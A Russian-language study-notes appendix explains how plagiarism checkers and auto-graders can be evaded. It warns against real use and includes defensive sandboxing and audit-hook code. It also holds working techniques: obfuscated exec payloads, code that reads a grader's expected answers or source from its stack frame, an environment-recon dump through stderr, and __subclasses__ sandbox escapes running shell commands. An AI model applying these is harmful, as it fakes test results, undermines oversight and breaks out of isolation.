# Приложение B. Взаимодействие с системами проверки кода (контекст)

> Это приложение — **контекстное**: приёмы, которые применяются к системам проверки кода (MOSS, JPlag, Dolos, Codequiry). Цель — не инструкция, а понимание того, **что эти системы видят** и **что не видят**. Основной фокус конспекта — на скрытых возможностях языка; системы проверки здесь — как прикладная область, где эти возможности становятся инструментами.
>
> ⚠️ **Не используйте эти приёмы в реальных тестирующих системах.** Применение техник из этого раздела в учебных или соревновательных окружениях нарушает правила этих систем и может привести к дисциплинарным последствиям. Материал представлен исключительно для понимания механики работы систем проверки и проектирования защиты.
>
> Подробнее про механизмы детекции — см. **Приложение A**.

## B.1. Косметические приёмы — обман на уровне токенов

Косметические приёмы меняют **внешний вид** кода, не меняя логику. Они работают на уровне токенов и AST-узлов — ломают k-граммы и хеш-винновинг (см. A.1), но **легко детектируются** AST-нормализацией (A.5).

### Переименование идентификаторов { #pereimenovanie }

```python
# Оригинал:
def calculate_total_price(items, discount):
    subtotal = sum(item.price for item in items)
    return subtotal * (1 - discount / 100)

# Косметика — все имена заменены:
def f(a, b):
    c = sum(x.p for x in a)
    return c * (1 - b / 100)
```

**Эффективность**: низкая. MOSS и JPlag токенизируют код — `IDENTIFIER` заменяет все имена. `calculate_total_price` и `f` — одинаковый токен `IDENTIFIER`.

### Inlining / outlining { #inlining }

```python
# Оригинал — три функции:
def parse(s): return int(s)
def validate(n): return 0 <= n <= 100
def process(s):
    n = parse(s)
    if validate(n): return n * 2

# Inlining — всё в одной функции:
def process(s):
    n = int(s)
    if 0 <= n <= 100: return n * 2

# Outlining — разбивка на ещё больше функций:
def _to_int(s): return int(s)
def _check_range(n): return 0 <= n <= 100
def _double(n): return n * 2
def process(s):
    n = _to_int(s)
    if _check_range(n): return _double(n)
```

**Эффективность**: средняя. Меняет AST-структуру (количество `FunctionDef` узлов), но нормализаторы MOSS/JPlag сливают inline-функции обратно.

### Изменение управляющих конструкций { #izmenenie }

```python
# Оригинал — for + if:
result = []
for x in data:
    if x > 0:
        result.append(x * 2)

# Вариант 1 — while вместо for:
result = []; i = 0
while i < len(data):
    x = data[i]
    if x > 0: result.append(x * 2)
    i += 1

# Вариант 2 — list comprehension:
result = [x * 2 for x in data if x > 0]

# Вариант 3 — filter + map:
result = list(map(lambda x: x * 2, filter(lambda x: x > 0, data)))

# Вариант 4 — инверсия условия:
result = []
for x in data:
    if x <= 0: continue
    result.append(x * 2)
```

**Эффективность**: средняя. Меняет тип AST-узла (`For` → `While`, `For` → `ListComp`), но семантика та же. AST-нормализаторы (A.5) сводят все варианты к канонической форме.

### Замена типов данных { #zamena }

```python
# Оригинал — list:
data = [1, 2, 3, 4, 5]

# Вариант — tuple:
data = (1, 2, 3, 4, 5)

# Вариант — set:
data = {1, 2, 3, 4, 5}

# Вариант — dict keys:
data = dict.fromkeys([1, 2, 3, 4, 5]).keys()
# или в 3.7+ — dict сохраняет порядок
```

### Мёртвый код (dead code insertion) { #mertvyy }

```python
# Оригинал:
def solve(n):
    return n * (n + 1) // 2

# С мёртвым кодом:
def solve(n):
    _dummy = (31 * 42 + n) % 17  # бессмысленная операция
    _unused = [i**2 for i in range(n)]  # неиспользуемый результат
    return n * (n + 1) // 2
```

**Эффективность**: низкая против современных систем. Dead code elimination (A.8) убирает неиспользуемые вычисления перед сравнением. Но против простых систем (Winnowing без нормализации) — работает.

### Замена библиотек { #zamena }

```python
# requests → httpx:
# import requests → import httpx
# requests.get(url) → httpx.get(url)

# json → orjson:
# import json → import orjson
# json.loads(s) → orjson.loads(s)

# os.path → pathlib:
# os.path.join(a, b) → str(Path(a) / b)
```

**Эффективность**: средняя. Меняет имена модулей и функций, но если API эквивалентен — семантика та же.

### Арифметические эквиваленты { #arifmeticheskie }

```python
# `3` → `1 + 1 + 1`     — ломает k-граммы, но constant folding убирает
# `x * 2` → `x + x`     — другой AST-узел (Mult → Add)
# `x * 2` → `x << 1`    — Mult → LShift
# `a and b` → `not (not a or not b)`  — De Morgan
# `x > 5` → `not (x <= 5)`           — инверсия
```

⚠️ Constant folding (свёртка констант) на этапе компиляции сворачивает `1 + 1 + 1` обратно в `3`. Но антиплагиат-системы работают с **исходником**, не с байт-кодом — для них `1+1+1` и `3` — разные токены.

## B.2. Архитектурные приёмы — перенос логики в рантайм

Архитектурные приёмы переносят логику **из статического кода в динамическую память** — в аннотации, в `__dict__`, в `exec`-строки. Это намного сложнее детектировать, потому что AST-анализатор видит «пустышку», а реальный код появляется только при выполнении.

### Аннотации как данные { #annotatsii }

```python
# Вместо присваивания — аннотация:
config: {"host": "localhost", "port": 8080, "debug": True}
# В рантайме:
import __main__
cfg = __main__.__annotations__["config"]
print(cfg["host"])  # 'localhost'
```

Аннотация не создаёт переменную `config` — она хранится в `__annotations__` dict'е модуля. AST-анализатор видит `AnnAssign` узел с `value=None`, а не `Assign` с конкретным значением.

### `setattr` для динамических атрибутов { #setattr }

```python
# Вместо:
class Config:
    host = "localhost"
    port = 8080

# Динамически:
config_data = {"host": "localhost", "port": 8080}
Config = type("Config", (), {})
for k, v in config_data.items():
    setattr(Config, k, v)
```

AST видит `For` + `Call(setattr)` — не имена атрибутов. Нормализатор не может статически вытащить `host`/`port`.

### `compile` + `exec` — код из строки { #compile }

```python
# Код спрятан в строке, которая собирается динамически:
parts = ["pri", "nt", "(", "'hello'", ")"]
code = "".join(parts)  # "print('hello')"
exec(compile(code, "<dynamic>", "exec"))

# Или из base64:
import base64
encoded = "cHJpbnQoImhlbGxvIik="  # base64 of print("hello")
exec(base64.b64decode(encoded).decode())
```

AST-анализатор исходника видит только `exec(compile(...))` — не видит, **что** выполняется. Это самый сильный приём против статического анализа, но самый подозрительный — `exec` в студенческом коде сразу привлекает внимание.

### `types.FunctionType` + `types.CodeType` — сборка функции из байт-кода { #typesfunctiontype }

```python
import types

# Создать функцию напрямую из code object:
code = compile("x * 2 + 1", "<dynamic>", "eval")
func = types.FunctionType(code.co_consts[0], globals(), "f")
# или из существующей функции — скопировать и модифицировать:
original = lambda x: x * 2
new_code = original.__code__.replace(co_name="obfuscated")
new_func = types.FunctionType(new_code, globals(), "obfuscated")
```

Это **самый глубокий** приём — функция существует только как объект в рантайме, в исходнике нет ни `def`, ни `lambda`. Детектируется только динамическим анализом (A.7) или audit hooks (PEP 578).

### `type()` — динамическое создание классов { #type }

```python
# Вместо:
class Handler:
    def process(self, data): return data.upper()

# Динамически:
Handler = type("Handler", (), {
    "process": lambda self, data: data.upper()
})
```

### Комбинированный коктейль { #kombinirovannyy }

```python
# Логика в строке, строка в аннотации, исполнение через exec:
_payload: "cHJpbnQoJ2hlbGxvJyk="  # base64
import base64, __main__
exec(base64.b64decode(__main__.__annotations__["_payload"]).decode())
```

AST видит: `AnnAssign` + `Import` + `Exec`. Что реально выполняется — не видно без запуска.

⚠️ **Все архитектурные приёмы детектируются динамическим анализом** (A.7): запусти код, собери trace, сравни поведение. Но динамический анализ дорог и редко используется в тестирующих системах.

## B.3. Перехват аргументов через фреймы и ctypes

Самые «хакерские» приёмы — работа с internals CPython для чтения/изменения состояния вызывающего кода.

### `sys._getframe` — чтение локальных переменных вызывающего { #sysgetframe }

```python
import sys

def read_frame_vars():
    """Читает локальные переменные функции, вызвавшей read_frame_vars."""
    caller_frame = sys._getframe(1)     # 1 = на один уровень вверх
    caller_locals = caller_frame.f_locals
    # Ищем что-то похожее на ответ:
    for name, value in caller_locals.items():
        if name.startswith("expected") or name.startswith("answer"):
            return value
    return None

def check_solution(student_answer):
    expected_answer = 42  # ← правильный ответ
    # ... код проверки ...
    result = read_answer()  # ← чтение expected_answer
    return student_answer == result
```

### `ctypes.pythonapi.PyFrame_LocalsToFast` — запись изменений обратно { #ctypespythonapipyframelocalstofast }

```python
import sys, ctypes

def modify_caller():
    """Меняет локальную переменную в вызывающей функции."""
    frame = sys._getframe(1)
    frame.f_locals["result"] = 42  # меняем dict locals
    # f_locals — это копия; чтобы записать обратно в frame:
    ctypes.pythonapi.PyFrame_LocalsToFast(ctypes.py_object(frame), ctypes.c_int(0))

def compute():
    result = 0
    modify_caller()  # ← меняет result на 42
    return result    # 42, хотя вычислений не было
```

⚠️ `PyFrame_LocalsToFast` — недокументированная C-API функция. Работает на CPython, не работает на PyPy/Jython. Может быть удалена в будущих версиях.

### Подмена `co_name` / `co_filename` { #podmena }

```python
import types

def real_function():
    """Эта функция делает что-то подозрительное."""
    import os; os.system("echo hacked")

# Подменяем имя и файл в code object:
real_function.__code__ = real_function.__code__.replace(
    co_name="innocent_helper",
    co_filename="<stdlib>",
)
# В traceback теперь будет: File "<stdlib>", line 1, in innocent_helper
```

### Чтение данных из фрейма тестирующего { #chtenie }

```python
import sys

def check(student_code):
    expected_output = "correct_result"
    test_number = 5
    # ... вызов student_code ...
    exec(student_code, {"_check": check})

# Student code:
import sys
frame = sys._getframe(1)
if frame.f_locals.get("test_number") == 5:
    print(frame.f_locals.get("expected_output"))
else:
    print("wrong")
```

⚠️ Современные тестирующие системы изолируют student code через `exec(code, restricted_globals)` — `sys._getframe` возвращает фрейм `exec`, не тестирующего скрипта. Но если изоляция неполная — фрейм доступен.

## B.4. Интроспекция окружения тестирующих систем

Интроспекция окружения — запустить код в тестирующей системе и собрать **всю** информацию о окружении через один `raise`. Результат попадает в stderr, который система обычно показывает при ошибке.

### Универсальный «комбайн» — собрать всё в JSON { #universalnyy }

```python
import sys, os, json, platform

info = {
    "sys.version": sys.version,
    "sys.executable": sys.executable,
    "sys.flags": {k: getattr(sys.flags, k) for k in dir(sys.flags) if not k.startswith('_')},
    "sys._xoptions": dict(sys._xoptions),
    "sys.path": sys.path[:20],
    "os.environ": {k: v for k, v in os.environ.items() if k.startswith(("PYTHON", "PATH", "HOME", "USER"))},
    "platform": {
        "system": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "processor": platform.processor(),
    },
    "modules": sorted(sys.modules.keys())[:200],
    "implementation": str(sys.implementation),
    "pid": os.getpid(),
    "ppid": os.getppid(),
    "uid": getattr(os, "getuid", lambda: "N/A")(),
    "gid": getattr(os, "getgid", lambda: "N/A")(),
}

# Linux-only:
try:
    with open("/proc/self/cmdline", "rb") as f:
        info["cmdline"] = f.read().replace(b"\x00", b" ").decode()
    with open("/proc/1/cgroup") as f:
        info["cgroup"] = f.read()[:500]
    info["dockerenv"] = os.path.exists("/.dockerenv")
except Exception:
    pass

# Поднимаем как RuntimeError — попадёт в stderr тестирующей системы
raise RuntimeError(f"RECON_DUMP: {json.dumps(info, default=str, indent=2)}")
```

В логе тестирующей системы появится JSON со всем, что удалось собрать. Это даёт максимум разведки за одну попытку.

### Конкретные проверки { #konkretnye }

```python
# Удаляет ли система комментарии?
with open(__file__) as f:
    has_comments = "SECRET_FLAG" in f.read()
# Если True — система не трогает комментарии, можно прятать в них

# Какой тест сейчас выполняется?
frame = sys._getframe(1)
test_num = frame.f_locals.get("test_number", "unknown")
# Позволяет давать разные ответы на разные тесты

# Какие библиотеки доступны?
for mod in ["numpy", "pandas", "requests", "sympy", "networkx"]:
    try:
        __import__(mod)
        available[mod] = True
    except ImportError:
        available[mod] = False

# Чтение исходника проверяющего скрипта:
import inspect
caller = sys._getframe(1)
caller_file = caller.f_code.co_filename
with open(caller_file) as f:
    source = f.read()
print(source[:5000])  # первые 5 KB исходника проверяющего
sys.exit(0)  # выйти до выполнения теста
```

### Защита тестирующих систем { #zaschita }

Современные системы противодействуют разведке:

- **`exec(code, restricted_globals)`** — `sys` недоступен, `__builtins__` урезан.
- **Sandbox через subprocess** — student code в отдельном процессе, `sys._getframe` не видит родителя.
- **seccomp** — системные вызовы ограничены, `open("/proc/...")` запрещён.
- **Время выполнения** — если код работает > 5 секунд, убивается.
- **Сравнение вывода** — система проверяет stdout, не stderr (разведка через `raise` не видна).

**PEP 578 audit hooks — со стороны обороны.** Самый точный инструмент из этого списка: хук на «опасные» события работает на уровне C API для **всех** операций интерпретатора, независимо от того, насколько «чистые» `globals` у студенческого кода (механика — подробно в 10.7):

```python
# на стороне тестирующей системы, до загрузки решения
import sys

ALLOWED_PREFIXES = ("/app/", "/tmp/run/")   # что можно открывать

def defense(event, args):
    if event == "open":
        path = str(args[0])
        if not path.startswith(ALLOWED_PREFIXES) and "site-packages" not in path:
            raise PermissionError(f"open вне песочницы: {path}")
    if event in ("subprocess.Popen", "os.system"):
        raise RuntimeError("запуск процессов запрещён")
    if event in ("socket.connect", "socket.getaddrinfo"):
        raise PermissionError("сетевой доступ запрещён")

sys.addaudithook(defense)

# дальше — загрузка и запуск решения:
exec(student_code, {"__builtins__": __builtins__})
```

Принципиальное отличие от `restricted_globals`: хук нельзя обойти через `__subclasses__()` (B.5) или вычитывание фреймов (B.3) — какой бы обходной путь ни привёл к `os.system(...)`, событие `os.system` всё равно возникнет, и исключение хука оборвёт операцию. Ограничения — честно:

- **`try/except` глотает отказ.** Исключение хука перехватывается обычным `except` вокруг `open(...)` — операция сорвана, но исполнение продолжается. Гарантированное завершение делает второй хук: на первом нарушении он выставляет флаг, а wrapper-процесс убивает воркера.
- **ctypes идёт мимо событий** (10.7, «чего hooks не дают») — `ctypes.CDLL("libc.so.6").system(...)` не породит `os.system`.
- **Хуки не наследуются** дочерними процессами — subprocess-песочница настраивает свои.
- **Событие не означает блокировку по умолчанию** — хук только наблюдение, пока не поднято исключение.

Поэтому в продакшн audit hooks комбинируют с seccomp и контейнерами (пункты выше) — они закрывают то, что hooks принципиально не могут. Более того, «идеальной песочницы» на CPython не существует в принципе: каноническая демонстрация — выступление Ned Batchelder «Tarpit» (PyCon 2012), разборы побегов из pyjails — в D.7. Audit hooks дают слой, который **дёшев, точен и не портит жизнь честному коду** — но это один слой из нескольких.

### Код возврата как канал данных: 8 бит да/нет { #kod-vozvrata }

Когда stdout занят выводом, stderr — диагностикой, а файлы и переменные окружения проверяющий не читает, у программы остаётся один свободный канал — код возврата. На POSIX это ровно 8 бит, целое 0–255: всё за пределами усекается по модулю 256 (`sys.exit(300)` вернёт `44`, `sys.exit(256)` — `0`, `sys.exit(-1)` — `255`). Восемь бит — это восемь независимых ответов да/нет, и никто не мешает упаковать в них результаты проверок:

```python
# checker.py: сообщает, какие из восьми проверок провалил решение
import sys, ast

src = open("solution.py").read()
tree = ast.parse(src)

names = {n.id for n in ast.walk(tree) if isinstance(n, ast.Name)}
attrs = {n.attr for n in ast.walk(tree) if isinstance(n, ast.Attribute)}
called = names | attrs          # имена и атрибуты, встретившиеся в коде

forbidden = {"eval", "exec", "open", "compile", "system"}

results = [
    not ({"os", "system"} <= called),  # бит 0 — нет os.system(...)
    not (called & forbidden),          # бит 1 — нет запрещённых вызовов
    len(src) <= 10_000,                # бит 2 — лимит размера
    len(tree.body) <= 20,              # бит 3 — не более 20 инструкций верхнего уровня
    src.isascii(),                     # бит 4 — только ASCII
    "TODO" not in src,                 # бит 5 — не забыт ли TODO
    len(src.splitlines()) >= 3,        # бит 6 — не трёхстрочник от балды
    src.count("(") == src.count(")"),  # бит 7 — скобки сбалансированы
]

code = 0
for i, ok in enumerate(results):
    if not ok:
        code |= 1 << i
sys.exit(code)   # 0 — все зелёные; 5 — провалены биты 0 и 2
```

```python
# потребитель: разворачивает маску обратно
import subprocess, sys

rc = subprocess.run([sys.executable, "checker.py"]).returncode
failed = [i for i in range(8) if rc >> i & 1]
print("провалены проверки:", failed or "нет")
```

Это не экзотика, а документированное поведение реальных инструментов: pylint возвращает код возврата битовой маской (1 — fatal, 2 — error, 4 — warning, 8 — refactor, 16 — convention, 32 — usage error), и биты складываются при нескольких группах нарушений: файл без docstring'ов даст `16`, а если к нему ещё и `too-few-public-methods` — `16 | 8 = 24`.

Четыре границы применимости:

- **0 зарезервирован под успех.** Для любого постороннего потребителя (CI, make, shell-скрипт) `0` — «всё хорошо», ненулевой — «авария». Использовать бит 0 под данные нельзя: канал работает, только если потребитель знает конвенцию.
- **Старшие коды выглядят как сигналы.** Оболочка сообщает о процессе, убитом сигналом N, как `128+N`: увидев `137`, человек подумает про SIGKILL. Нормальный выход с кодом 200 оболочка не переинтерпретирует (`bash -c 'exit 200'` оставит `$? == 200`), но данные надёжнее держать в диапазоне 0–127, не трогая старший бит.
- **Читающие API различаются.** `subprocess` возвращает честный код, а смерть от сигнала видна как `-9`; `os.system` — сырой 16-битный статус waitpid (`exit 5` придёт как `1280`), для этого трюка он непригоден.
- **Это POSIX-конвенция.** На Windows коды возврата 32-битные — переносимый код не должен полагаться на усечение до 8 бит.

## B.5. Песочницы и обход через `__subclasses__()`

Классический приём обхода песочниц, которые вычищают `__builtins__` и запрещают `import`. Идея: **из любого объекта** можно добраться до `object` (базового класса всех классов), а оттуда — до **любого класса в интепретаторе**, включая `os._wrap_close`, `warnings.catch_warnings` и другие, у которых есть доступ к `os`/`sys`.

### Цепочка: `().__class__.__base__.__subclasses__()` { #tsepochka }

```python
# Шаг 1: () — пустой кортеж. Его тип — tuple.
().__class__            # <class 'tuple'>

# Шаг 2: __base__ — базовый класс tuple. Это object.
().__class__.__base__   # <class 'object'>

# Шаг 3: __subclasses__() — все классы, прямо унаследованные от object.
().__class__.__base__.__subclasses__()
# [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ...,
#  <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, ...]
```

Тот же трюк работает из **любого** объекта: `[].__class__.__base__.__subclasses__()`, `"".__class__.__base__.__subclasses__()`, `{}.__class__.__base__.__subclasses__()`, `(0).__class__.__base__.__subclasses__()` — все дадут один и тот же список, потому что `__base__` любого типа рано или поздно ведёт к `object`.

### Поиск класса с доступом к `os` { #poisk }

```python
# Найти os._wrap_close (он создаётся при os.popen и держит ссылку на os)
for cls in ().__class__.__base__.__subclasses__():
    if cls.__name__ == "_wrap_close":
        # У этого класса в __init__ есть self.__init__.__globals__ —
        # это globals модуля os!
        os_globals = cls.__init__.__globals__
        os = os_globals  # это словарь globals модуля os
        system = os["system"]   # функция os.system
        break

system("id")   # обходим песочницу, выполняем произвольную команду
```

### Универсальный «finder» — найти любой модуль в `__subclasses__` { #universalnyy }

```python
def find_module_global(module_name, attr_name):
    """Найти attr_name в globals любого класса, чей __init__ определён в module_name."""
    for cls in ().__class__.__base__.__subclasses__():
        try:
            g = cls.__init__.__globals__
            if g.get("__name__") == module_name or module_name in g.get("__file__", ""):
                if attr_name in g:
                    return g[attr_name]
        except (AttributeError, KeyError):
            continue
    raise LookupError(f"{module_name}.{attr_name} не найден")

system = find_module_global("os", "system")
system("whoami")
```

### Альтернативные пути обхода { #alternativnye }

Даже если `__subclasses__()` заблокирован, остаются:

```python
# 1. gc.get_objects() — все объекты в куче
import gc
for obj in gc.get_objects():
    if hasattr(obj, "__name__") and obj.__name__ == "system":
        obj("whoami")  # нашёл os.system в куче

# 2. sys.modules — если модуль хоть раз импортировался
import sys
sys.modules["os"].system("whoami")

# 3. license() / help() / copyright() — _Printer объекты с __globals__
copyright.__class__.__init__.__globals__["__builtins__"]["__import__"]("os").system("whoami")

# 4. Через format string vulnerability — утечка атрибутов через __globals__:
#    ВАЖНО: list.__init__ — C-level slot wrapper, у него НЕТ __globals__,
#    поэтому `.format([])` НЕ работает. Нужен объект Python-level класса,
#    чей __init__ — обычная функция:
import subprocess
"{0.__init__.__globals__[os].system}".format(subprocess.Popen)
# → '<built-in function system>' — format-string превращает атрибут в repr.
# Это утечка информации (можно читать __globals__ целиком как строку),
# но **не RCE сама по себе** — для выполнения команды нужно ещё вызвать
# полученную ссылку. Для RCE через format-string нужна отдельная прокси-функция
# или `__format__` с побочным эффектом у целевого объекта.

# 5. Через catch_warnings:
import warnings
warnings.catch_warnings.__init__.__globals__["__builtins__"]["__import__"]("os").system("id")
```

### Защита: почему это сложно заблокировать { #zaschita }

1. **`__class__`, `__base__`, `__subclasses__` — это базовые протоколы Python**. Заблокировать их — значит сломать `isinstance`, `type()`, наследование. Реалистичная блокировка требует AST-фильтрации (Часть VII, 7.13) с запретом доступа к любым dunder-атрибутам.

2. **Любой объект работает как точка входа**: `().__class__`, `[].__class__`, `(0).__class__`, `True.__class__`, `len.__class__`, даже `None.__class__` — все ведут к `object`. Заблокировать все стартовые объекты невозможно (они в `__builtins__`).

3. **Альтернативные пути** не ограничиваются `__subclasses__()` — `gc`, `sys.modules`, `__globals__` на любом function/method, format-strings — все ведут к arbitrary code execution.

### Минимальная защита песочницы { #minimalnaya }

```python
import sys, builtins, ast

# 1. Ограниченный __builtins__
safe_builtins = {
    'print': print, 'len': len, 'range': range, 'int': int, 'str': str,
    'list': list, 'dict': dict, 'tuple': tuple, 'set': set, 'bool': bool,
    'enumerate': enumerate, 'zip': zip, 'map': map, 'filter': filter,
    'sum': sum, 'min': min, 'max': max, 'sorted': sorted, 'reversed': reversed,
    'abs': abs, 'round': round, 'True': True, 'False': False, 'None': None,
    'isinstance': isinstance, 'TypeError': TypeError, 'ValueError': ValueError,
    # Никаких: __import__, eval, exec, compile, open, getattr, setattr, type,
    #          globals, locals, vars, dir, hasattr, delattr, input
}

sandbox_globals = {'__builtins__': safe_builtins}

# 2. AST-фильтрация исходника (см. 7.13) — запретить доступ к dunder-атрибутам
class SandboxTransformer(ast.NodeTransformer):
    FORBIDDEN = {'__class__', '__base__', '__subclasses__', '__globals__',
                 '__builtins__', '__import__', '__code__', '__mro__',
                 '__dict__', '__init_subclass__'}
    def visit_Attribute(self, node):
        if node.attr in self.FORBIDDEN:
            raise ValueError(f"Доступ к {node.attr} запрещён")
        return node
    # Также запретить import
    def visit_Import(self, node):
        raise ValueError("import запрещён")
    def visit_ImportFrom(self, node):
        raise ValueError("from ... import запрещён")

code = "print(1 + 2)"
tree = ast.parse(code)
SandboxTransformer().visit(tree)
ast.fix_missing_locations(tree)
exec(compile(tree, "<sandbox>", "exec"), sandbox_globals)
```

⚠️ **Реалистичная оценка**: AST-фильтрация + ограниченный `__builtins__` защищают от 90% тривиальных обходов, но не от целенаправленной атаки. Для реальной изоляции — отдельный процесс (subprocess с `--no-site`, seccomp-фильтр, separate user namespace), либо отдельная VM. Python-уровневая песочница — это учебный пример, не production-защита.

## B.6. Что работает, а что нет — реалистичная оценка

### Эффективность приёмов против разных систем { #effektivnost }

| Приём | Winnowing (A.1) | AST-нормализация (A.5) | Динамический анализ (A.7) | Стилометрия (A.6) |
|---|---|---|---|---|
| Переименование | ❌ не работает | ❌ | ❌ | ⚠️ (стиль имён) |
| Inlining/outlining | ⚠️ частично | ❌ | ❌ | ✅ работает |
| Замена `for`→`while` | ⚠️ | ❌ | ❌ | ✅ |
| Мёртвый код | ✅ | ❌ (DCE) | ❌ | ✅ |
| Замена библиотек | ✅ | ⚠️ | ❌ | ✅ |
| Аннотации как данные | ✅ | ✅ | ⚠️ | ✅ |
| `exec` из строки | ✅ | ✅ | ⚠️ | ✅ |
| `types.FunctionType` | ✅ | ✅ | ⚠️ | ✅ |
| Перехват фреймов | ✅ | ✅ | ⚠️ | ✅ |

✅ = приём работает (обходит детекцию), ❌ = не работает (система видит сквозь), ⚠️ = частично.

**Вывод**: против современных систем (MOSS, JPlag, Dolos) с AST-нормализацией косметика **не работает**. Архитектурные приёмы (`exec`, `types.FunctionType`) обходят статический анализ, но **привлекают внимание** — `exec` в студенческом коде — красный флаг. Динамический анализ (если система его применяет) видит всё.

### Что точно НЕ стоит делать { #chto }

- **`exec` в студенческом коде** — мгновенно привлекает внимание преподавателя, даже если антиплагиат не сработал.
- **`__subclasses__()` обход** — работает только в sandboxed окружениях, в обычной тестирующей системе бесполезен.
- **Перехват фреймов** — требует `sys._getframe`, который часто заблокирован.
- **Массовое переименование в `a`, `b`, `c`** — стилометрия (A.6) помечает как «стиль обфускатора».
- **Мёртвый код в больших количествах** — cycle complexity (A.4) растёт, метрики Хальстеда (A.3) аномальны.

### Зелёная зона — что легально и эффективно { #zelenaya }

Если задача — не «обойти систему проверки», а «написать код так, чтобы он был **своим**»:

1. **Понять алгоритм** и написать с нуля — не смотреть на оригинал.
2. **Использовать другой стиль** — list comprehension вместо for-loop, `dataclass` вместо dict, `match/case` вместо if-elif. Это легально и меняет AST.
3. **Другие структуры данных** — `deque` вместо `list`, `Counter` вместо `dict`, `heapq` вместо `sorted`.
4. **Другие библиотеки** — если оригинал на `requests`, переписать на `httpx` или `urllib`.
5. **Добавить обработку ошибок** — `try/except`, валидацию, logging. Это меняет структуру и улучшает код.
6. **Юнит-тесты** — если есть тесты, код явно «свой», и преподаватель это видит.

Эти приёмы не «обманывают» системы проверки — они делают код **действительно другим**, что и есть цель проверки.

---

